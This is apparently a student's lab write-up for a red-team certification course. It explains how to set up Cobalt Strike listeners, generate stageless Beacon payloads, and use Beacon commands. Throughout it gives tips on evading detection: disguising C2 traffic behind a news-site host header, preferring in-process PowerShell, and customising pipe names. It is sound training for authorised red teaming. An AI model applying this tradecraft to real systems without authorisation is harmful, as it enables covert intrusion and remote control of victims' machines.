# CRTO — Cobalt Strike Primer Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Cobalt Strike Primer
**Objective:** Create listeners, generate payloads, and interact with Beacon

---

## Overview

This is the foundational CS lab. Everything built here (listeners, payloads) is reused throughout the entire course and exam. Get these configs right once and they carry forward.

---

## Step 1 — Connect to Team Server

```
Host:     10.0.0.5
Port:     50050
Password: Passw0rd!
```

> In a real engagement the team server lives on a VPS, not on the local network. The attacker desktop connects to it over the internet (or a VPN). The team server is what beacons call back to.

---

## Step 2 — Listeners

Listeners define **how Beacon communicates back** to the team server. Each listener type serves a different purpose in the attack chain.

### HTTP Listener

```
Name:              http
Payload:           Beacon HTTP
HTTP Hosts:        www.bleepincomputer.com
HTTP Host (Stager): www.bleepincomputer.com
```

**Purpose:** Primary egress listener. Beacon checks in over HTTP.
**OPSEC note:** The HTTP host header is set to `www.bleepincomputer.com` — this is the Malleable C2 redirect. Traffic looks like a legitimate web request to a known site rather than a raw IP callback.

---

### SMB Listener

```
Name:     smb
Payload:  Beacon SMB
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

**Purpose:** Peer-to-peer lateral movement. SMB Beacons don't call back to the team server directly — they communicate through a parent Beacon over a named pipe.
**When to use:** After lateral movement (`jump`, `psexec`, `scshell`) to machines that can't reach the internet directly. The parent Beacon relays traffic.
**OPSEC note:** No new outbound connections from the target — traffic rides existing SMB. Much stealthier than HTTP on internal hosts.

---

### TCP Listener (External)

```
Name:    tcp
Payload: Beacon TCP
Port:    4444
Bind:    False (all interfaces)
```

**Purpose:** Peer-to-peer over TCP. Similar to SMB but uses TCP instead of named pipes.
**When to use:** Environments where SMB is restricted or filtered between hosts.
**Bind to localhost: False** = listens on all interfaces, allowing connections from other machines.

---

### TCP Listener (Local)

```
Name:    tcp-local
Payload: Beacon TCP
Port:    1337
Bind:    True (localhost only)
```

**Purpose:** Local privilege escalation pivots. Used when exploiting a local service or process that needs to call back to Beacon on the same machine.
**Bind to localhost: True** = only accepts connections from `127.0.0.1`. Safer — can't be reached from the network.
**Common use case:** SweetPotato, PrintSpoofer, and other local privesc tools that execute a payload on the same host.

---

## Listener Comparison

| Listener | Transport | Use Case | Outbound Traffic |
|---|---|---|---|
| `http` | HTTP | Primary C2 egress | Yes — to team server |
| `smb` | Named Pipe | Post-lateral movement (internal) | No — through parent Beacon |
| `tcp` | TCP | Post-lateral movement (SMB restricted) | No — through parent Beacon |
| `tcp-local` | TCP (127.0.0.1) | Local privesc payload callbacks | No — localhost only |

---

## Step 3 — Generate Payloads

```
Payloads > Windows Stageless Generate All Payloads
Output folder: C:\Payloads
```

**Stageless vs Staged:**
- **Stageless** — the full Beacon is embedded in the payload. Larger file but no second-stage download needed. More reliable and better for OPSEC (no stager network request).
- **Staged** — small stager that downloads the full Beacon at runtime. Smaller file but makes an additional network request that can be detected.

CRTO uses stageless throughout. On real engagements stageless is generally preferred.

**Key payloads generated:**

| File | Use |
|---|---|
| `http_x64.exe` | Standard HTTP Beacon EXE |
| `http_x64.xprocess.bin` | Shellcode for process injection (used in AppDomain hijack) |
| `smb_x64.exe` | SMB Beacon EXE for lateral movement |
| `tcp-local_x64.exe` | TCP local Beacon for privesc payloads |

---

## Step 4 — Interact with Beacon

Run `http_x64.exe` on the target → Beacon checks in → interact via the CS console.

### Essential Beacon Commands

```bash
help                    # list all commands
help <command>          # help for specific command
getuid                  # current user context
ps                      # process list
sleep <seconds>         # set check-in interval (lower = noisier)
pwd                     # current directory
ls                      # list directory
upload <file>           # upload file to target
download <file>         # download file from target
shell <cmd>             # run via cmd.exe (spawns process — noisy)
run <cmd>               # run without cmd.exe (slightly quieter)
powershell <cmd>        # run via powershell.exe
powerpick <cmd>         # run PowerShell in-process (no new process — stealthy)
execute-assembly        # run .NET assembly in memory
```

> **OPSEC hierarchy:** `powerpick` > `run` > `shell` > `powershell`
> Avoid `shell` and `powershell` where possible — they spawn new processes that are easily detected.

---

## Key Takeaways

- Listeners are set up **once** at the start of an engagement and reused throughout
- SMB and TCP listeners are for **internal** hosts — they chain through a parent HTTP Beacon
- Always use **stageless** payloads in CRTO and on real engagements
- `tcp-local` (port 1337, localhost only) is specifically for local privesc techniques like SweetPotato
- The named pipe name for SMB (`TSVCPIPE-...`) should be customised in the Malleable C2 profile on real engagements to avoid default CS signatures
